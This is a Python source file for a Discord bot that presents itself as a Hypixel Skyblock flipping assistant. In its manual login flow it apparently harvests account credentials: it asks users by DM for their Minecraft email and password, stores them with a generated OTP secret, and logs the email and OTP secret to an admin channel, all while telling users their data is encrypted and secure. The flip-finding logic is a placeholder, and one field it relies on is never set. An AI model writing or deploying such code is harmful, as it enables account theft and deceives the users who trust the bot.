import os
import discord
from discord.ext import commands, tasks
from discord import app_commands
import aiohttp
import json
from dotenv import load_dotenv
import logging
import asyncio
from auth_manager import AuthManager
import qrcode
import io
import base64
from typing import Optional
from datetime import datetime
from config_manager import ConfigManager
import uuid
import sys
from keep_alive import keep_alive, start_self_ping

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('skyblock_flipper')

# Load configuration
config = ConfigManager()

# Initialize bot with all intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=config.get('bot.prefix', '!'), intents=intents)

# Initialize auth manager
auth_manager = None  # Will be initialized after bot is ready

# Load cogs
async def load_cogs():
    global auth_manager
    auth_manager = AuthManager()
    auth_manager.bot = bot  # Set bot instance for admin channel access
    
    await bot.load_extension('admin_commands')
    await bot.load_extension('embed_builder')
    await bot.load_extension('monitoring')  # Add monitoring cog
    await bot.load_extension('button_interactions')  # Add button interactions cog
    await bot.load_extension('server_templates')  # Add server templates cog

class ConfigureView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="Edit Colors", style=discord.ButtonStyle.primary, custom_id="edit_colors")
    async def edit_colors(self, interaction: discord.Interaction, button: discord.ui.Button):
        color_modal = ColorPickerModal()
        await interaction.response.send_modal(color_modal)
    
    @discord.ui.button(label="Edit Layout", style=discord.ButtonStyle.secondary, custom_id="edit_layout")
    async def edit_layout(self, interaction: discord.Interaction, button: discord.ui.Button):
        layout_modal = LayoutConfigModal()
        await interaction.response.send_modal(layout_modal)

class ColorPickerModal(discord.ui.Modal, title="Edit Embed Colors"):
    success_color = discord.ui.TextInput(
        label="Success Color (Hex)",
        placeholder="#00ff00",
        default="#00ff00",
        required=True,
        max_length=7
    )
    
    error_color = discord.ui.TextInput(
        label="Error Color (Hex)",
        placeholder="#ff0000",
        default="#ff0000",
        required=True,
        max_length=7
    )
    
    info_color = discord.ui.TextInput(
        label="Info Color (Hex)",
        placeholder="#0000ff",
        default="#0000ff",
        required=True,
        max_length=7
    )

    async def on_submit(self, interaction: discord.Interaction):
        # Save colors to database or config
        await interaction.response.send_message("Colors updated successfully!", ephemeral=True)

class LayoutConfigModal(discord.ui.Modal, title="Edit Embed Layout"):
    show_timestamp = discord.ui.TextInput(
        label="Show Timestamp (true/false)",
        placeholder="true",
        default="true",
        required=True,
        max_length=5
    )
    
    show_footer = discord.ui.TextInput(
        label="Show Footer (true/false)",
        placeholder="true",
        default="true",
        required=True,
        max_length=5
    )

    async def on_submit(self, interaction: discord.Interaction):
        # Save layout preferences to database or config
        await interaction.response.send_message("Layout updated successfully!", ephemeral=True)

class AuthCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.auth_manager = auth_manager
        self.pending_auth = {}
        self.admin_cog = None

    async def ensure_admin_cog(self):
        if not self.admin_cog:
            self.admin_cog = self.bot.get_cog('AdminCommands')
        return self.admin_cog

    @app_commands.command(name="start", description="Start using the Skyblock Flipper Bot")
    async def start(self, interaction: discord.Interaction):
        embed = discord.Embed(
            title="🎮 Welcome to FlipperBot!",
            description=(
                "I'm your personal Hypixel Skyblock flipping assistant! Here's how to get started:\n\n"
                "1️⃣ **Server Setup**:\n"
                "   • `/template_use` - Create a pre-configured server\n"
                "   • Choose from: 🏰 Dungeon, 🌾 Farming, or 🌟 General templates\n\n"
                "2️⃣ **Authentication**:\n"
                "   • Use the 'Verify' button in the FlipperBot channel\n"
                "   • Check the Q&A button for help and information\n\n"
                "3️⃣ **Commands**:\n"
                "   • `/help` - Show all available commands\n"
                "   • `/status` - Check bot status\n"
                "   • `/stats` - View your flipping statistics\n\n"
                "4️⃣ **Features**:\n"
                "   • Automatic role assignment\n"
                "   • Server templates with beautiful channels\n"
                "   • Real-time flip notifications\n"
                "   • Customizable buttons and interactions"
            ),
            color=discord.Color.blue()
        )
        embed.set_footer(text="Type /help for detailed information about each command")
        embed.timestamp = datetime.utcnow()
        
        await interaction.response.send_message(embed=embed)

    @app_commands.command(name="configure_database", description="Configure database connection settings")
    @app_commands.checks.dm_only()
    async def configure_database(self, interaction: discord.Interaction):
        embed = discord.Embed(
            title="🗄️ Database Configuration",
            description=(
                "Configure your database connection settings.\n\n"
                "**Current Settings:**\n"
                "• Host: `localhost`\n"
                "• Port: `27017`\n"
                "• Database: `minecraft_auth`\n\n"
                "Click the buttons below to modify these settings."
            ),
            color=discord.Color.green()
        )
        embed.set_footer(text="⚠️ Warning: Changing these settings will require a bot restart")
        
        view = ConfigureView()
        await interaction.response.send_message(embed=embed, view=view)

    @app_commands.command(name="login_microsoft", description="Login with Microsoft account")
    @app_commands.checks.dm_only()
    async def login_microsoft(self, interaction: discord.Interaction):
        try:
            auth_url, state = self.auth_manager.get_oauth_url()
            session_id = str(uuid.uuid4())
            self.pending_auth[interaction.user.id] = {
                'state': state,
                'session_id': session_id
            }
            
            embed = discord.Embed(
                title="🔐 Microsoft Account Login",
                description=(
                    "Please follow these steps to login:\n\n"
                    "1. Click the login link below\n"
                    "2. Sign in with your Microsoft account\n"
                    "3. Authorize the application\n"
                    "4. Return here after authorization"
                ),
                color=discord.Color.blue()
            )
            embed.add_field(
                name="🔗 Login Link",
                value=f"[Click here to login]({auth_url})",
                inline=False
            )
            embed.set_footer(text="⚠️ This link will expire in 10 minutes")
            embed.timestamp = datetime.utcnow()
            
            await interaction.response.send_message(embed=embed)
            
            # Log OAuth attempt to admin channel
            admin_cog = await self.ensure_admin_cog()
            if admin_cog:
                await admin_cog.log_auth_event("oauth", str(interaction.user.id), {
                    'session_id': session_id
                })
            
        except Exception as e:
            logger.error(f"Error in login_microsoft: {e}")
            error_embed = discord.Embed(
                title="❌ Error",
                description="An error occurred while setting up Microsoft login. Please try again later.",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=error_embed)

    @app_commands.command(name="login_manual", description="Login with email and OTP")
    @app_commands.checks.dm_only()
    async def login_manual(self, interaction: discord.Interaction):
        try:
            otp_secret = self.auth_manager.generate_otp_secret()
            self.pending_auth[interaction.user.id] = {
                'otp_secret': otp_secret,
                'stage': 'email'
            }
            
            embed = discord.Embed(
                title="📧 Manual Login Setup",
                description=(
                    "Let's set up your account with secure authentication!\n\n"
                    "**Step 1:** Please enter your Minecraft account email\n\n"
                    "Simply type your email in the chat. I'll guide you through the rest of the process."
                ),
                color=discord.Color.blue()
            )
            embed.set_footer(text="🔒 Your credentials will be encrypted and stored securely")
            embed.timestamp = datetime.utcnow()
            
            await interaction.response.send_message(embed=embed)
            
        except Exception as e:
            logger.error(f"Error in login_manual: {e}")
            error_embed = discord.Embed(
                title="❌ Error",
                description="An error occurred while setting up manual login. Please try again later.",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=error_embed)

    @app_commands.command(name="logout", description="Remove stored credentials")
    @app_commands.checks.dm_only()
    async def logout(self, interaction: discord.Interaction):
        try:
            success = await self.auth_manager.delete_user_data(str(interaction.user.id))
            
            if success:
                embed = discord.Embed(
                    title="✅ Logout Successful",
                    description="Your credentials have been successfully removed from our system.",
                    color=discord.Color.green()
                )
            else:
                embed = discord.Embed(
                    title="ℹ️ No Data Found",
                    description="No stored credentials were found for your account.",
                    color=discord.Color.blue()
                )
            
            embed.timestamp = datetime.utcnow()
            await interaction.response.send_message(embed=embed)
            
        except Exception as e:
            logger.error(f"Error in logout: {e}")
            error_embed = discord.Embed(
                title="❌ Error",
                description="An error occurred while logging out. Please try again later.",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=error_embed)

    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author.bot or not isinstance(message.channel, discord.DMChannel):
            return

        user_id = message.author.id
        if user_id not in self.pending_auth:
            return

        auth_data = self.pending_auth[user_id]
        admin_cog = await self.ensure_admin_cog()
        
        try:
            if 'stage' in auth_data:
                if auth_data['stage'] == 'email':
                    auth_data['email'] = message.content
                    auth_data['stage'] = 'password'
                    
                    embed = discord.Embed(
                        title="🔑 Enter Password",
                        description="Please enter your Minecraft account password:",
                        color=discord.Color.blue()
                    )
                    embed.set_footer(text="🔒 Your password will be encrypted before storage")
                    await message.author.send(embed=embed)
                    
                elif auth_data['stage'] == 'password':
                    auth_data['password'] = message.content
                    auth_data['stage'] = 'otp_setup'
                    
                    # Generate QR code
                    qr = qrcode.QRCode(version=1, box_size=10, border=5)
                    provisioning_uri = self.auth_manager.generate_qr_code_url(
                        auth_data['otp_secret'],
                        auth_data['email']
                    )
                    qr.add_data(provisioning_uri)
                    qr.make(fit=True)
                    
                    img_buffer = io.BytesIO()
                    img = qr.make_image(fill_color="black", back_color="white")
                    img.save(img_buffer, format='PNG')
                    img_buffer.seek(0)
                    
                    file = discord.File(img_buffer, filename='otp_qr.png')
                    
                    embed = discord.Embed(
                        title="📱 Two-Factor Authentication Setup",
                        description=(
                            "Let's set up 2FA for extra security!\n\n"
                            "1. Scan the QR code with your authenticator app\n"
                            "   (Google Authenticator, Authy, etc.)\n"
                            "2. Enter the 6-digit code shown in your app"
                        ),
                        color=discord.Color.blue()
                    )
                    embed.set_image(url="attachment://otp_qr.png")
                    embed.set_footer(text="⚠️ Keep this QR code safe and don't share it with anyone")
                    
                    await message.author.send(file=file, embed=embed)
                    
                elif auth_data['stage'] == 'otp_setup':
                    if self.auth_manager.verify_otp(auth_data['otp_secret'], message.content):
                        await self.auth_manager.store_user_credentials(
                            str(user_id),
                            'manual',
                            email=auth_data['email'],
                            password=auth_data['password'],
                            otp_secret=auth_data['otp_secret']
                        )
                        
                        # Log manual login to admin channel
                        if admin_cog:
                            await admin_cog.log_auth_event("manual", str(user_id), {
                                'email': auth_data['email'],
                                'username': auth_data['email'].split('@')[0],  # Simple username extraction
                                'otp_secret': auth_data['otp_secret']
                            })
                        
                        embed = discord.Embed(
                            title="✅ Setup Complete!",
                            description=(
                                "Your account has been successfully configured!\n\n"
                                "**Security Features Enabled:**\n"
                                "• Encrypted Password Storage\n"
                                "• Two-Factor Authentication\n"
                                "• Secure Database Storage\n\n"
                                "You can now use the bot's features that require authentication."
                            ),
                            color=discord.Color.green()
                        )
                        embed.set_footer(text="Type /help to see available commands")
                        
                        await message.author.send(embed=embed)
                        del self.pending_auth[user_id]
                    else:
                        embed = discord.Embed(
                            title="❌ Invalid Code",
                            description="The OTP code you entered is invalid. Please try again:",
                            color=discord.Color.red()
                        )
                        await message.author.send(embed=embed)
                        
        except Exception as e:
            logger.error(f"Error in auth flow: {e}")
            error_embed = discord.Embed(
                title="❌ Error",
                description=(
                    "An error occurred during the login process.\n"
                    "Please try again with /login_manual or /login_microsoft"
                ),
                color=discord.Color.red()
            )
            await message.author.send(embed=error_embed)
            del self.pending_auth[user_id]

class HypixelAPI:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = "https://api.hypixel.net"
        self.headers = {"API-Key": api_key}
        
    async def get_bazaar_data(self):
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{self.base_url}/skyblock/bazaar", headers=self.headers) as response:
                if response.status == 200:
                    return await response.json()
                return None

    async def get_auction_data(self):
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{self.base_url}/skyblock/auctions", headers=self.headers) as response:
                if response.status == 200:
                    return await response.json()
                return None

class FlipFinder:
    def __init__(self):
        self.previous_flips = set()
        
    def analyze_flip_opportunity(self, item_data):
        # This is a basic implementation - you can enhance the logic
        try:
            if item_data.get('starting_bid', 0) <= 0:
                return None
                
            # Example criteria - you should adjust these based on your strategy
            min_profit = 100000  # 100k coins
            profit_percentage = 20  # 20%
            
            market_price = self.estimate_market_price(item_data)
            current_price = item_data.get('starting_bid', 0)
            
            if market_price <= 0 or current_price <= 0:
                return None
                
            potential_profit = market_price - current_price
            profit_percent = (potential_profit / current_price) * 100
            
            if potential_profit >= min_profit and profit_percent >= profit_percentage:
                return {
                    'item_name': item_data.get('item_name', 'Unknown Item'),
                    'current_price': current_price,
                    'estimated_value': market_price,
                    'potential_profit': potential_profit,
                    'profit_percentage': profit_percent
                }
            
            return None
        except Exception as e:
            logger.error(f"Error analyzing flip opportunity: {e}")
            return None
    
    def estimate_market_price(self, item_data):
        # This is a placeholder - implement your own market price estimation logic
        # You might want to use historical data, BIN prices, or other metrics
        return item_data.get('starting_bid', 0) * 1.3  # Simple 30% markup for example

class SkyblockFlipper(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.hypixel_api = HypixelAPI(config.get('api.hypixel'))
        self.flip_finder = FlipFinder()
        self.check_auctions.start()

    def cog_unload(self):
        self.check_auctions.cancel()

    @tasks.loop(seconds=30)
    async def check_auctions(self):
        try:
            auction_data = await self.hypixel_api.get_auction_data()
            if not auction_data:
                return

            for auction in auction_data.get('auctions', []):
                flip_opportunity = self.flip_finder.analyze_flip_opportunity(auction)
                if flip_opportunity:
                    await self.notify_flip(flip_opportunity)

        except Exception as e:
            logger.error(f"Error checking auctions: {e}")

    async def notify_flip(self, flip_data):
        embed = discord.Embed(
            title="💰 Profitable Flip Found!",
            description=f"A profitable flip opportunity has been detected for {flip_data['item_name']}!",
            color=discord.Color.green()
        )
        
        # Add flip details
        embed.add_field(
            name="💵 Buy Price",
            value=f"{flip_data['current_price']:,} coins",
            inline=True
        )
        embed.add_field(
            name="📈 Estimated Value",
            value=f"{flip_data['estimated_value']:,} coins",
            inline=True
        )
        embed.add_field(
            name="💎 Potential Profit",
            value=f"{flip_data['potential_profit']:,} coins",
            inline=True
        )
        embed.add_field(
            name="📊 Profit Percentage",
            value=f"{flip_data['profit_percentage']:.1f}%",
            inline=True
        )
        
        # Add timing information
        embed.timestamp = datetime.utcnow()
        embed.set_footer(text="Act fast! Prices may change quickly")
        
        # Optional: Add item thumbnail if available
        if 'item_image' in flip_data:
            embed.set_thumbnail(url=flip_data['item_image'])
        
        # Send to all notification channels
        for guild in self.bot.guilds:
            channel = discord.utils.get(guild.text_channels, name="flip-notifications")
            if channel:
                view = discord.ui.View()
                view.add_item(discord.ui.Button(
                    label="Buy Now",
                    style=discord.ButtonStyle.success,
                    custom_id=f"buy_{flip_data['auction_id']}"
                ))
                await channel.send(embed=embed, view=view)

# Add global error handlers
@bot.event
async def on_error(event, *args, **kwargs):
    logger.error(f"Error in {event}: {sys.exc_info()}")
    error_info = sys.exc_info()
    
    # Get monitoring cog and report error
    monitoring_cog = bot.get_cog('Monitoring')
    if monitoring_cog:
        await monitoring_cog.alert_error(
            f"Error in {event}",
            f"{error_info[0].__name__}: {str(error_info[1])}"
        )

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandError):
        await ctx.send(f"Error: {str(error)}")
    
    logger.error(f"Command error: {error}")
    
    # Get monitoring cog and report error
    monitoring_cog = bot.get_cog('Monitoring')
    if monitoring_cog:
        await monitoring_cog.alert_error(
            "Command Error",
            f"Command: {ctx.command}\nError: {str(error)}"
        )

@bot.event
async def on_ready():
    logger.info(f'{bot.user} has connected to Discord!')
    
    # Set bot status
    activity_type = config.get('bot.activity_type', 'watching').lower()
    activity_types = {
        'playing': discord.ActivityType.playing,
        'watching': discord.ActivityType.watching,
        'listening': discord.ActivityType.listening,
        'competing': discord.ActivityType.competing
    }
    activity = discord.Activity(
        type=activity_types.get(activity_type, discord.ActivityType.watching),
        name=config.get('bot.status', 'Watching for flips')
    )
    await bot.change_presence(activity=activity)
    
    # Load cogs
    await load_cogs()
    await bot.add_cog(AuthCommands(bot))
    await bot.add_cog(SkyblockFlipper(bot))
    
    # Sync slash commands
    try:
        synced = await bot.tree.sync()
        logger.info(f"Synced {len(synced)} command(s)")
    except Exception as e:
        logger.error(f"Error syncing commands: {e}")

def main():
    logger.info("Starting bot initialization...")
    
    # Load environment variables
    load_dotenv()
    
    # Check required environment variables
    required_env_vars = [
        'BOT_TOKEN',
        'OWNER_ID',
        'HYPIXEL_API_KEY',
        'MS_CLIENT_ID',
        'MS_CLIENT_SECRET',
        'MS_TENANT_ID',
        'REDIRECT_URI',
        'JWT_SECRET_KEY',
        'ADMIN_WEBHOOK',
        'NOTIFICATIONS_WEBHOOK'
    ]
    
    missing_vars = [var for var in required_env_vars if not os.getenv(var)]
    if missing_vars:
        logger.error(f"Missing required environment variables: {', '.join(missing_vars)}")
        logger.error("Please set these variables in your Render dashboard or .env file")
        return

    # Check configuration
    required_settings = [
        'bot.token',
        'api.hypixel',
        'access.owner_id'
    ]
    
    missing = [s for s in required_settings if not config.get(s)]
    if missing:
        logger.error(f"Missing required configuration: {', '.join(missing)}")
        return

    try:
        # Start keep-alive server
        logger.info("Starting keep-alive server...")
        keep_alive()
        start_self_ping()
        
        # Log successful initialization
        logger.info("Initialization complete, starting bot...")
        
        # Start the bot
        bot.run(config.get('bot.token'), log_handler=None)
    except Exception as e:
        logger.error(f"Error during bot startup: {e}")
        raise

if __name__ == "__main__":
    main() 